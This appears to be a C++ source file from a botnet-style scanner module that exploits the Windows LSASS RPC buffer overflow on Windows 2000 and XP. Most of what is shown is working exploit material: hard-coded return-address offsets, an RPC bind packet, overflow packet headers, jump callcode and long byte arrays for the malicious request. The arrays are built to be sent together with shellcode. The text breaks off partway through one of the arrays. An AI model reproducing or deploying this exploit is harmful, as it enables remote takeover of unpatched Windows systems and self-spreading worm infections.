/*	LSASS SHIT */

#include "main.h"
#include "mainctrl.h"
#include "scanner.h"
#include "utility.h"
#include "shellcode.h"

/*
	The Hives - Declare Guerre Nucleaire:
	----------------------------------------
	Had an atomic bore - in 2004
	Did some atomic tricks - in 2006
	I got out way late - in 2008
	I'm gonna do it again - in 2010
	And for 5... 7... 9 and 11, the guess is yours.
*/

class CScannerLSASS : public CScannerBase
{
public:
	CScannerLSASS();
	virtual ~CScannerLSASS() throw() { }

	bool Exploit();
};

/*
	Offsets (call esp/jmp esp):
	==============================

	WinXP Home/Pro SP0-1 English, lsass.dll, call esp:
	-----------------------------------------------------
	0x01004600, 0x01004632
	
	Win2K Pro SP0-4 English, mprapi.dll, jmp/call ebx:
	-----------------------------------------------------
	0x77324321, 0x77324329, 0x77324457, 0x773244a3, 0x773244c2
	0x77324686, 0x773246c9, 0x773246ef, 0x77324700, 0x77325474
	0x77325492, 0x773254b0, 0x77326c5a, 0x77326c62, 0x77326cb6
	0x77326cc4, 0x77326cd3, 0x77326cdb, 0x77327755, 0x773277aa
	0x7732b6ec, 0x7732b70e, 0x7732b76f, 0x7732bbbb, 0x7732bbe9
	0x7732d076, 0x7732d0a2, 0x7732d1ef, 0x7732d2ad, 0x7732e100
	0x7732e186, 0x7732ebb0, 0x7732ebf3, 0x773219db
*/

#define PACKET_SHELLCODE_OFFSET	0x25

#define OFFSET_PACKET_SIZE		0x8			// Size of the full packet
#define OFFSET_PACKET_HINT		0x10		// Size of the data without the rpc header
#define OFFSET_STRING_SIZE1		0x18		// Size of the string (unicode chars)
#define OFFSET_STRING_SIZE2		0x20		// Size of the string (unicode chars)
#define STRING_LENGTH			0x2000		// The length of the string for win2k (bytes)
#define STRING_LENGTH_XP		0x4000		// The length of the string for winxp (bytes)
#define RPC_LENGTH				0x30		// The length of the rpc header
#define OFFSET_CALLCODE_WIN2K	0x1630		// The callcode offset from the start of the string
#define OFFSET_CALLCODE_WINXP	0x7BC		// The callcode offset from the start of the string
#define OFFSET_EIP_WIN2K		0x1638		// The eip offset from the start of the string
#define OFFSET_SHELLCODE_WIN2K	0x1640		// The shellcode offset from the start of the string
#define OFFSET_SHELLCODE_WINXP	0x18		// The shellcode offset from the start of the string
#define ADDR_CALLESP_WINXP		0x01004600	// Address of call esp

unsigned char szPacket2K_CallCode[] = { 0xEB, 0x00, 0x06, 0x00 /* jmp +0x06 */ };
unsigned char szPacketXP_CallCode[] = { 0xE9, 0x3F, 0xF8, 0xFF, 0xFF, /* call -0x7B8 */ };
unsigned char szOffsetCallEbxWin2K[] = { 0x21, 0x00, 0x43, 0x00, 0x32, 0x00, 0x77, 0x00 /* 0x77324321 */ };

unsigned char bindstr[] = {
	0x05, 0x00, 0x0B, 0x03, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
	0xB8, 0x10, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 
	0x6A, 0x28, 0x19, 0x39, 0x0C, 0xB1, 0xD0, 0x11, 0x9B, 0xA8, 0x00, 0xC0, 0x4F, 0xD9, 0x2E, 0xF5, 
	0x00, 0x00, 0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 
	0x2B, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00
};

unsigned char szPacket2K_Header[] = {
	0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0x20, 0x0D, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
	0x08, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x19, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x19, 0x04, 0x00, 0x00 };

unsigned char szPacketXP_Header[] = {
	0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0x20, 0x15, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x08, 0x15, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x19, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x19, 0x08, 0x00, 0x00 };

unsigned char szPacket2K_End[] = {
	0xAD, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3A, 0x00, 0x5C, 0x00, 0x00, 0x00, 
	0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3A, 0x00, 
	0x5C, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 
	0x43, 0x00, 0x3A, 0x00, 0x5C, 0x00, 0x00, 0x00, 0x08, 0x08, 0x79, 0x00, 0x13, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x61, 0x00, 
	0x69, 0x00, 0x6E, 0x00, 0x2E, 0x00, 0x62, 0x00, 0x61, 0x00, 0x73, 0x00, 0x74, 0x00, 0x61, 0x00, 
	0x72, 0x00, 0x74, 0x00, 0x2E, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x74, 0x00, 0x00, 0x00, 0xAD, 0xBA, 
	0x00, 0x00, 0x00, 0x00, 0x50, 0x08, 0x79, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x0B, 0x00, 0x00, 0x00, 0x44, 0x00, 0x4F, 0x00, 0x4D, 0x00, 0x41, 0x00, 0x49, 0x00, 0x4E, 0x00, 
	0x5C, 0x00, 0x42, 0x00, 0x4C, 0x00, 0x41, 0x00, 0x00, 0x00, 0xAD, 0xBA, 0x68, 0x6C, 0x13, 0x00, 
	0xB6, 0xF0, 0xBB, 0x63, 0xE5, 0x24, 0x0F, 0x5F, 0xD4, 0x5F, 0x44, 0x44, 0x7B, 0xDF, 0xA2, 0x42, 
	0x1E, 0xDA, 0xC6, 0xBD, 0x4F, 0xF8, 0x6D, 0x2D, 0x7B, 0xCC, 0xBF, 0xFA, 0xDA, 0xF6, 0x71, 0xC0, 
	0x57, 0x99, 0xEB, 0x1A, 0x0B, 0x41, 0xCB, 0x9C, 0xF6, 0x46, 0x98, 0xCA, 0x0C, 0x2E, 0x4F, 0x5D, 
	0xE6, 0xFE, 0x34, 0xFD, 0xE2, 0xBC, 0xD1, 0x72, 0x47, 0x01, 0xE1, 0xF5, 0xAF, 0xDD, 0x60, 0x01, 
	0x6A, 0x27, 0x36, 0xC0, 0xF6, 0x26, 0x8B, 0x98, 0x9C, 0x90, 0x1F, 0x54, 0x83, 0x23, 0x1D, 0x50, 
	0x78, 0xFF, 0xA9, 0xC3, 0x6F, 0xBC, 0xD6, 0xEA, 0xED, 0x7A, 0xC9, 0x15, 0x3E, 0xD3, 0x07, 0x43, 
	0x92, 0x18, 0xA3, 0x43, 0xB7, 0x84, 0x70, 0x26, 0x91, 0x99, 0x10, 0xAC, 0xFB, 0x6A, 0x3F, 0x37, 
	0xF6, 0xFA, 0xA8, 0xA7, 0x32, 0x02, 0x3A, 0x32, 0x7B, 0xC4, 0x22, 0x38, 0x37, 0x2F, 0x08, 0x2D, 
	0xB3, 0xFB, 0xD8, 0x16, 0x03, 0xAB, 0xC5, 0xAC, 0xB7, 0xD2, 0x9E, 0x5C, 0x28, 0xAB, 0x7E, 0x8E, 
	0xF5, 0x54, 0xA3, 0xBF, 0xF0, 0x1E, 0x93, 0x06, 0x37, 0xFC, 0xD0, 0x1C, 0xB2, 0xB6, 0xD5, 0x23, 
	0x5B, 0xB3, 0x64, 0xE7, 0xD4, 0x3B, 0x11, 0xE9, 0x1F, 0xBD, 0xC8, 0xF5, 0x96, 0x66, 0x40, 0x47, 
	0xD8, 0xC7, 0xC2, 0x25, 0xF5, 0x56, 0xD7, 0x58, 0xE6, 0xB1, 0x41, 0x9C, 0x45, 0x85, 0xB8, 0x15, 
	0x55, 0xCF, 0x3E, 0x58, 0x99, 0x1B, 0xEF, 0xE2, 0x79, 0xE4, 0xAF, 0xA1, 0xB9, 0xF5, 0xC4, 0xB1, 
	0xAD, 0x5B, 0xDF, 0x06, 0xCB, 0x0F, 0x14, 0xF7, 0x6F, 0x00, 0xC3, 0xAE, 0x50, 0xF4, 0xAF, 0xC3, 
	0x20, 0xBE, 0x89, 0x9B, 0x9B, 0x1D, 0xB5, 0x08, 0x2F, 0x90, 0x9C, 0xA2, 0x93, 0xB5, 0x99, 0xEB, 
	0xD3, 0x0A, 0xB4, 0x84, 0xBD, 0x65, 0x47, 0xC1, 0xF9, 0xDC, 0xD5, 0x58, 0xB3, 0x4F, 0x51, 0x18, 
	0x05, 0x1F, 0xB7, 0x64, 0x5F, 0x66, 0x50, 0x2E, 0x7D, 0x4F, 0x3A, 0x40, 0x32, 0xFD, 0x8E, 0x04, 
	0xA2, 0xCA, 0x48, 0xD0, 0xEC, 0xE8, 0x70, 0xBE, 0x68, 0x1C, 0x32, 0x20, 0xF2, 0xC1, 0xE2, 0xA9, 
	0x20, 0x2C, 0x43, 0xF0, 0xD8, 0xAF, 0xEF, 0x81, 0x2A, 0xAD, 0x57, 0x04, 0x30, 0x39, 0xF6, 0x45, 
	0xBB, 0xAC, 0x01, 0x97, 0xD4, 0x54, 0xBF, 0x66, 0xDF, 0x16, 0x29, 0x01, 0x67, 0x4B, 0xB8, 0xA3, 
	0x6A, 0x85, 0x42, 0x2B, 0x4D, 0xA0, 0x9B, 0x0C, 0xFB, 0xB6, 0x7C, 0xC5, 0xBD, 0x81, 0x3E, 0x1A, 
	0x74, 0xD9, 0xDF, 0x13, 0x4B, 0x58, 0x98, 0x05, 0xCF, 0xEA, 0x61, 0xFF, 0xEB, 0x9C, 0x86, 0x78, 
	0xEC, 0x3F, 0x39, 0x38, 0xFD, 0x03, 0x88, 0x7D, 0xC5, 0x8B, 0x2D, 0x36, 0x15, 0x16, 0x1B, 0xE8, 
	0x94, 0x3C, 0xE9, 0x0B, 0x89, 0x10, 0x99, 0xE6, 0x14, 0x11, 0x4F, 0xC5, 0xF8, 0x02, 0xB8, 0xA1, 
	0x95, 0xB1, 0x58, 0xCF, 0x2B, 0xF6, 0xB2, 0x17, 0x3E, 0x3F, 0x65, 0x48, 0xDE, 0xE2, 0xAE, 0x4D, 
	0xE7, 0xB8, 0x91, 0xDE, 0xFA, 0xBF, 0x3C, 0x46, 0xE6, 0x00, 0xA4, 0x40, 0x7E, 0xA3, 0x35, 0xDE, 
	0xA1, 0xA0, 0x02, 0xF9, 0xEB, 0x15, 0x30, 0x4A, 0x7A, 0x02, 0x38, 0xE9, 0x2D, 0x3A, 0xF3, 0x18, 
	0x2C, 0x94, 0x13, 0x47, 0xF7, 0x35, 0xA7, 0x49, 0x37, 0xA0, 0x98, 0x1B, 0xAA, 0xBF, 0xF5, 0x8B, 
	0x02, 0xE3, 0xF4, 0x44, 0x54, 0x6A, 0x85, 0x91, 0x8D, 0xBF, 0x0C, 0xE4, 0x4C, 0xC2, 0x7F, 0x67, 
	0x39, 0x82, 0x66, 0x4B, 0x0E, 0x4B, 0x34, 0x4C, 0xA8, 0xAC, 0x0A, 0x0F, 0x11, 0x51, 0x7B, 0x3E, 
	0x5A, 0xA3, 0xFB, 0x26, 0x46, 0xF2, 0x84, 0xAF, 0x3B, 0x6D, 0x00, 0x4A, 0x77, 0x81, 0x09, 0x70, 
	0xDB, 0xB7, 0xF5, 0xEC, 0xEF, 0xA2, 0xF8, 0x28, 0x03, 0x11, 0xAD, 0x93, 0x3D, 0x1D, 0xAC, 0xD6, 
	0xC3, 0x4F, 0xFA, 0xEF, 0x82, 0x73, 0xCA, 0xD0, 0xB7, 0x07, 0x06, 0x1B, 0x90, 0x6E, 0x13, 0x00, 
	0xB6, 0xF0, 0xBB, 0x63, 0xE5, 0x24, 0x0F, 0x5F, 0xB5, 0x5A, 0xF2, 0x29, 0x28, 0xEA, 0x70, 0xAC, 
	0x08, 0x9F, 0x80, 0xBB, 0x92, 0x7E, 0x3C, 0x25, 0xF4, 0xE2, 0xBF, 0x8A, 0x57, 0x91, 0xF1, 0xC0, 
	0x8A, 0xD2, 0x01, 0x4F, 0x3A, 0x42, 0xEE, 0x70, 0x55, 0xC3, 0x75, 0x4C, 0x0C, 0x07, 0xFF, 0x46, 
	0xA8, 0xDF, 0xA9, 0x19, 0x45, 0x68, 0xD0, 0x72, 0x71, 0x01, 0xE1, 0x22, 0xAF, 0xDD, 0x88, 0xA1, 
	0xE4, 0x9C, 0x71, 0xC0, 0xF6, 0x15, 0xF0, 0x09, 0x11, 0x89, 0x1F, 0x0A, 0x83, 0x53, 0x1D, 0x50, 
	0x4E, 0x6C, 0x09, 0x64, 0x6F, 0xBC, 0xAE, 0xEA, 0x57, 0x3F, 0xB4, 0x15, 0x3E, 0xD3, 0x07, 0x43, 
	0x92, 0xED, 0x17, 0x5E, 0xB7, 0x84, 0x73, 0x26, 0x91, 0x36, 0x09, 0xFC, 0xFB, 0x92, 0x8A, 0x34, 
	0xEA, 0xFA, 0xA8, 0xA7, 0x32, 0xBB, 0x35, 0x32, 0x7B, 0xC4, 0x2A, 0x28, 0x37, 0x2F, 0x08, 0x2D, 
	0xB3, 0xFB, 0xD8, 0x16, 0xDB, 0xAB, 0xC5, 0xAC, 0xB7, 0x03, 0x0B, 0x5C, 0xD9, 0xAB, 0x7E, 0x8E, 
	0xF5, 0x54, 0xA3, 0xBF, 0xF0, 0x1E, 0x5C, 0x14, 0x37, 0xFC, 0xFB, 0x1C, 0xB2, 0xB6, 0xD5, 0x90, 
	0xBE, 0xB3, 0x64, 0xE7, 0xD4, 0xA1, 0x11, 0xE9, 0x1F, 0xBD, 0xC8, 0xF5, 0x96, 0x66, 0x40, 0x47, 
	0xD8, 0x8B, 0x8D, 0x25, 0xF5, 0x56, 0xD7, 0x58, 0xE6, 0xB1, 0x41, 0x9C, 0x03, 0x46, 0x70, 0x15, 
	0x55, 0xCF, 0x3E, 0x58, 0x99, 0x1B, 0xEF, 0xE2, 0x15, 0xE4, 0xAF, 0xA1, 0xFE, 0xF5, 0xC4, 0xB1, 
	0xAD, 0x5B, 0xDF, 0x06, 0xCB, 0x0F, 0x14, 0xF7, 0x6F, 0x00, 0xC3, 0xAE, 0x50, 0xAA, 0xAF, 0xC3, 
	0x20, 0xBE, 0xD2, 0x9B, 0x9B, 0x1D, 0xB5, 0x08, 0x2F, 0x90, 0x9C, 0xA2, 0x8A, 0xB5, 0x99, 0xEB, 
	0xD3, 0x0A, 0xB4, 0x84, 0x6D, 0x65, 0x47, 0xC1, 0xF9, 0xDC, 0xD5, 0x58, 0x2E, 0x81, 0x51, 0x18, 
	0x05, 0x8B, 0xB7, 0x64, 0x5F, 0x66, 0x50, 0xCD, 0x7D, 0x4F, 0x3A, 0x40, 0x32, 0xFD, 0x8E, 0x04, 
	0xA2, 0xCA, 0x48, 0xD0, 0x48, 0xE8, 0x70, 0x91, 0x21, 0x1C, 0x32, 0x20, 0xF2, 0xC1, 0xE2, 0xA9, 
	0xC3, 0x2C, 0x43, 0xF0, 0xD8, 0xAF, 0xEF, 0x81, 0x2A, 0xAD, 0x57, 0x04, 0x30, 0x39, 0xF6, 0x45, 
	0xBB, 0xAC, 0x9A, 0x97, 0xD4, 0x54, 0xBF, 0xE8, 0xDF, 0x16, 0x29, 0xB3, 0xDA, 0x4B, 0xB8, 0xA3, 
	0x6A, 0x85, 0x42, 0x2B, 0x4D, 0xA0, 0x9B, 0x7E, 0xFB, 0xB6, 0xD7, 0xC5, 0xBD, 0xAB, 0x3E, 0x1A, 
	0x74, 0xD9, 0xDF, 0x13, 0x4B, 0x58, 0x98, 0x05, 0xCF, 0xEA, 0x61, 0xFF, 0xEB, 0x9C, 0x86, 0x78, 
	0xEC, 0x3F, 0x39, 0x38, 0xFD, 0x03, 0x88, 0x7D, 0xC5, 0x8B, 0x2D, 0x36, 0x15, 0x16, 0x1B, 0xE8, 
	0x94, 0xBE, 0xE9, 0x0B, 0x89, 0x10, 0x99, 0xE6, 0x14, 0x11, 0x4F, 0xC5, 0xF8, 0x02, 0xB8, 0xA1, 
	0x95, 0xB1, 0x58, 0xCF, 0x2B, 0xF6, 0xB2, 0x17, 0x3E, 0x3F, 0x65, 0x18, 0xDE, 0xE2, 0xAD, 0x4D, 
	0xE7, 0xB8, 0x91, 0xDE, 0xFA, 0xBF, 0x3C, 0x46, 0xE6, 0x00, 0xA4, 0x40, 0x7E, 0xA3, 0x35, 0xDE, 
	0xA1, 0xA0, 0xDC, 0xF9, 0xEB, 0x15, 0x30, 0xFD, 0x7A, 0x02, 0x38, 0xE9, 0x2D, 0x3A, 0xF3, 0x18, 
	0x2C, 0x94, 0x13, 0x47, 0xF7, 0x64, 0xA7, 0x49, 0x37, 0xA0, 0x98, 0x1B, 0xAA, 0xBF, 0xF5, 0x8B, 
	0x02, 0xE3, 0xF4, 0x44, 0x54, 0x6A, 0x32, 0x91, 0x8D, 0xBF, 0x0C, 0xE4, 0x4C, 0xC2, 0x7F, 0x67, 
	0x39, 0x82, 0x66, 0x4B, 0x0E, 0x4B, 0x34, 0x4C, 0xA8, 0xAC, 0x0A, 0x0F, 0x11, 0x51, 0x7B, 0x3E, 
	0x5A, 0xA3, 0xFB, 0x26, 0x46, 0xF2, 0x84, 0xAF, 0x3B, 0x6D, 0x00, 0x4A, 0x77, 0x81, 0x09, 0x70, 
	0xDB, 0xB7, 0xF5, 0xEC, 0xEF, 0xA2, 0xF8, 0x28, 0x03, 0x11, 0xAD, 0xB8, 0x3D, 0x1D, 0xAC, 0xD6, 
	0xC3, 0x4F, 0xFA, 0xEF, 0x82, 0x73, 0xCA, 0xD0, 0xB7, 0x07, 0x06, 0x1B, 0xC0, 0x08, 0x00, 0x00 };

unsigned char szPacketXP_End[] = {
	0xF0, 0x00, 0xAD, 0x00, 0xBA, 0x00, 0x0D, 0x00, 0xF0, 0x00, 
	0xAD, 0x00, 0xBA, 0x00, 0x0D, 0x00, 0xF0, 0x00, 0xAD, 0x00, 0xBA, 0x00, 0x0D, 0x00, 0xF0, 0x00, 
	0xAD, 0x00, 0xBA, 0x00, 0xAB, 0x00, 0xAB, 0x00, 0xAB, 0x00, 0xAB, 0x00, 0xAB, 0x00, 0xAB, 0x00, 
	0xAB, 0x00, 0xAB, 0x00, 0x00, 0x00, 0xAD, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3A, 0x00, 0x5C, 0x00, 0x00, 0x00, 
	0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3A, 0x00, 
	0x5C, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 
	0x43, 0x00, 0x3A, 0x00, 0x5C, 0x00, 0x00, 0x00, 0x50, 0x1F, 0x79, 0x00, 0x13, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x6D, 0x00, 0x61, 0x00, 
	0x69, 0x00, 0x6E, 0x00, 0x2E, 0x00, 0x62, 0x00, 0x61, 0x00, 0x73, 0x00, 0x74, 0x00, 0x61, 0x00, 
	0x72, 0x00, 0x74, 0x00, 0x2E, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x74, 0x00, 0x00, 0x00, 0xAD, 0xBA, 
	0x00, 0x00, 0x00, 0x00, 0x98, 0x1F, 0x79, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x0B, 0x00, 0x00, 0x00, 0x44, 0x00, 0x4F, 0x00, 0x4D, 0x00, 0x41, 0x00, 0x49, 0x00, 0x4E, 0x00, 
	0x5C, 0x00, 0x42, 0x00, 0x4C, 0x00, 0x41, 0x00, 0x00, 0x00, 0xAD, 0xBA, 0x68, 0x6C, 0x13, 0x00, 
	0xF8, 0x6F, 0xB6, 0x71, 0x08, 0x78, 0x1D, 0xB8, 0x06, 0x79, 0x05, 0x41, 0x1B, 0x68, 0x8F, 0x31, 
	0x19, 0xA5, 0x30, 0xAE, 0xF1, 0x8E, 0x2D, 0x0E, 0xA2, 0xFE, 0x59, 0xAE, 0x0B, 0xE1, 0x2F, 0xE9, 
	0x68, 0xF6, 0x2B, 0xE2, 0xBB, 0x3D, 0x79, 0x06, 0xFE, 0xC9, 0x8F, 0x29, 0xBC, 0x10, 0x21, 0xC2, 
	0x80, 0x7A, 0xC8, 0xD2, 0x21, 0xAE, 0x0E, 0xB5, 0xB6, 0x4B, 0xF5, 0xDB, 0x41, 0x63, 0x4F, 0xCD, 
	0x3D, 0x50, 0x49, 0xEC, 0xB2, 0x16, 0x79, 0x16, 0xE6, 0x62, 0x54, 0x69, 0x06, 0x48, 0xAD, 0x91, 
	0xA4, 0x18, 0x40, 0x65, 0x47, 0x65, 0x0C, 0x32, 0x51, 0x9C, 0x3F, 0x03, 0x18, 0x89, 0x73, 0xCA, 
	0xCF, 0xA8, 0x4E, 0xAF, 0x44, 0x45, 0x1A, 0x5E, 0x74, 0x45, 0x59, 0x35, 0xA2, 0x2A, 0xC7, 0xE7, 
	0x12, 0xB3, 0x9B, 0x2D, 0x0D, 0x25, 0x9A, 0xD4, 0x72, 0x9F, 0x0B, 0x80, 0x63, 0xCD, 0x31, 0xDB, 
	0x88, 0xB4, 0xA7, 0xF7, 0xFF, 0xFB, 0xBE, 0xB7, 0x52, 0x8B, 0x98, 0x0F, 0x4E, 0xE2, 0xC6, 0x94, 
	0x3F, 0x7E, 0xC2, 0x7A, 0xBA, 0xA0, 0x69, 0xAC, 0x3E, 0x8F, 0x45, 0x6D, 0x70, 0x32, 0xFC, 0x1D, 
	0xFA, 0xFF, 0x6E, 0x5D, 0xF7, 0x2F, 0x4F, 0xDF, 0x4C, 0x97, 0x5E, 0xD5, 0x6F, 0x2A, 0x36, 0xF7, 
	0x97, 0x35, 0xF2, 0x35, 0xC5, 0x0E, 0x6B, 0x8A, 0xD2, 0x24, 0x62, 0xED, 0xD5, 0xFE, 0xC6, 0xB4, 
	0x5B, 0x3D, 0xF8, 0x93, 0xA6, 0x51, 0xCD, 0xB7, 0xBE, 0xEA, 0x3B, 0x25, 0x3D, 0x85, 0x2E, 0xEA, 
	0x4C, 0x7B, 0x5E, 0x54, 0x65, 0xB4, 0xD4, 0x5D, 0x04, 0x63, 0x9A, 0x11, 0x8D, 0x0E, 0x16, 0x9C, 
	0x52, 0x51, 0x3A, 0x7A, 0x71, 0x1F, 0x5C, 0xE5, 0x7E, 0xB7, 0xBD, 0xAE, 0x53, 0xE6, 0xB9, 0xD3, 
	0x26, 0x1A, 0x72, 0xD2, 0xEE, 0x24, 0x79, 0xE9, 0x90, 0xD5, 0x6B, 0x05, 0x3C, 0x53, 0x19, 0x81, 
	0x02, 0xAF, 0x14, 0x35, 0xC0, 0x72, 0xAB, 0x14, 0xFC, 0x61, 0x3F, 0x0F, 0xB9, 0xF2, 0xC0, 0x26, 
	0xDE, 0x93, 0x37, 0x6F, 0x79, 0x01, 0x52, 0x34, 0xDA, 0xD7, 0x1D, 0x31, 0x15, 0xD8, 0x27, 0xE1, 
	0x43, 0xD1, 0xB9, 0x5C, 0xCA, 0xC9, 0x41, 0x4E, 0x90, 0x0C, 0x6B, 0xD0, 0xCA, 0x68, 0xF1, 0x54, 
	0xDF, 0xDF, 0xE0, 0x9A, 0x2E, 0xFF, 0xE2, 0x18, 0x99, 0xF1, 0x7A, 0xF7, 0xB2, 0x89, 0x09, 0x8D, 
	0x50, 0x6E, 0x04, 0x47, 0x3B, 0x23, 0xAB, 0x29, 0xF4, 0x91, 0xA2, 0x7B, 0x11, 0x76, 0xDD, 0x57, 
	0x9B, 0xD0, 0xC9, 0x18, 0x1B, 0x89, 0x47, 0x1D, 0x93, 0xF4, 0x92, 0x31, 0x24, 0xB2, 0x2D, 0x1C, 
	0x9B, 0xD5, 0xA5, 0x2C, 0xE0, 0x85, 0x0E, 0x5C, 0xBC, 0xC9, 0x0D, 0x99, 0x1E, 0x39, 0x07, 0x24, 
	0xB6, 0x78, 0xA4, 0x97, 0x04, 0xDE, 0x7D, 0x93, 0x62, 0x48, 0x5A, 0xE0, 0xA0, 0x6E, 0xF7, 0xAF, 
	0xA5, 0xCB, 0x95, 0x47, 0x10, 0x68, 0x3D, 0x83, 0x4C, 0xF9, 0x5D, 0xA0, 0xEA, 0x1B, 0x9A, 0x4B, 
	0xE7, 0xA1, 0x89, 0x15, 0xF2, 0x56, 0x22, 0xD7, 0xD8, 0x1C, 0x2F, 0xEE, 0xE3, 0x75, 0x19, 0x6D, 
	0xBD, 0x77, 0xF0, 0x5B, 0x41, 0xB2, 0x85, 0xCD, 0x73, 0xC5, 0x92, 0xAA, 0x46, 0x31, 0x7D, 0xB1, 
	0x6A, 0x4E, 0x0D, 0x11, 0x38, 0x60, 0xA5, 0xC0, 0xE9, 0xC5, 0x34, 0xE6, 0x83, 0xEE, 0xF8, 0x34, 
	0x9E, 0xC7, 0xD6, 0x37, 0x21, 0x1F, 0xDA, 0x36, 0x55, 0xC2, 0x80, 0xDB, 0x5D, 0x94, 0x76, 0xF6, 
	0xAF, 0x2E, 0x07, 0x2D, 0x56, 0xCF, 0x1C, 0x6C, 0x6B, 0xBB, 0xA7, 0xF0, 0x6A, 0x3C, 0xBD, 0x55, 
	0x8A, 0xDE, 0x60, 0xD2, 0xDD, 0xA0, 0xD6, 0x03, 0x50, 0x01, 0x52, 0x01, 0x29, 0x0E, 0x38, 0x3A, 
	0x35, 0xCF, 0x63, 0x26, 0xB7, 0x51, 0xD0, 0x3F, 0xCD, 0x8D, 0x49, 0x2F, 0x6F, 0x98, 0xBD, 0x77, 
	0x5F, 0x0C, 0xBC, 0xA9, 0x64, 0x03, 0x6F, 0x6B, 0x7C, 0x6A, 0x8D, 0xB2, 0x90, 0x6E, 0x13, 0x00, 
	0xF8, 0x6F, 0xB6, 0x71, 0x08, 0x78, 0x1D, 0xB8, 0x12, 0x64, 0x83, 0x44, 0x2E, 0x71, 0x9E, 0x89, 
	0xCE, 0x16, 0xE6, 0x70, 0xBF, 0x41, 0xF6, 0xC7, 0x09, 0xFE, 0xF0, 0xB4, 0xDA, 0xE1, 0x2F, 0xE9, 
	0xF7, 0x24, 0xF1, 0x48, 0xDE, 0x51, 0x77, 0x58, 0xFE, 0xC9, 0x68, 0x58, 0xB3, 0x85, 0xA4, 0xC2, 
	0x4C, 0x07, 0xC8, 0xAC, 0x00, 0xAE, 0x0E, 0x7C, 0x4D, 0x02, 0xF1, 0x6D, 0x41, 0x63, 0x4F, 0xAB, 
	0xAC, 0x50, 0x49, 0xEC, 0xB2, 0x16, 0xE6, 0x1E, 0xFF, 0xAD, 0xA1, 0x0A, 0x06, 0xEC, 0xA2, 0xC0, 
	0xB1, 0x1E, 0x40, 0x66, 0xAD, 0xA5, 0x0A, 0xD9, 0xDC, 0x9C, 0x3F, 0xDD, 0x18, 0x89, 0x73, 0xCA, 
	0xCF, 0xA8, 0x0B, 0x8B, 0x44, 0x45, 0x10, 0xDD, 0x74, 0xB5, 0xB4, 0x72, 0xA2, 0x2A, 0xC7, 0xE7, 
	0x12, 0xB3, 0x9B, 0x2D, 0x0D, 0xAD, 0x9A, 0xD4, 0x71, 0x9F, 0x0B, 0x75, 0xD7, 0x50, 0x31, 0xDB, 
	0x88, 0xB4, 0xA7, 0xF7, 0xFF, 0x7E, 0xBE, 0xB7, 0x72, 0x8B, 0xA8, 0xD9, 0x4E, 0xA1, 0xC6, 0x94, 
	0x3F, 0x7E, 0xC2, 0x60, 0xBA, 0xA0, 0x69, 0xEA, 0x3E, 0x0F, 0x45, 0x6D, 0x70, 0x32, 0xD2, 0x1D, 
	0xFA, 0x91, 0x6E, 0x5D, 0xF7, 0x2F, 0xE4, 0x46, 0x4C, 0x97, 0x8D, 0xD5, 0x6F, 0x2A, 0x36, 0xF7, 
	0x97, 0x36, 0xF2, 0x35, 0xC5, 0x0E, 0x6B, 0x8A, 0x64, 0x24, 0x95, 0xED, 0xD5, 0xFE, 0xC6, 0xB4, 
	0x5B, 0x3D, 0xF8, 0x0F, 0xA6, 0x51, 0xCD, 0xB7, 0xBE, 0xEA, 0xEA, 0x8E, 0xFF, 0x74, 0x98, 0xEA, 
	0x4C, 0xCD, 0x5E, 0x54, 0x65, 0xB4, 0xD4, 0x5D, 0xCA, 0x63, 0x9A, 0x69, 0x8D, 0x0E, 0x16, 0x9C, 
	0x52, 0x51, 0x3A, 0x7A, 0x71, 0x1F, 0x5C, 0xE5, 0x7E, 0xB7, 0x6D, 0xAE, 0x53, 0xE6, 0xB9, 0xD3, 
	0x26, 0x1A, 0x72, 0xD2, 0xEE, 0x24, 0x79, 0xE9, 0x90, 0xD5, 0x6B, 0x05, 0x3C, 0x53, 0x19, 0x81, 
	0x02, 0xAF, 0x14, 0x35, 0xC0, 0x72, 0xF4, 0x16, 0xFC, 0x61, 0x3F, 0xA0, 0x91, 0xF2, 0xC0, 0x26, 
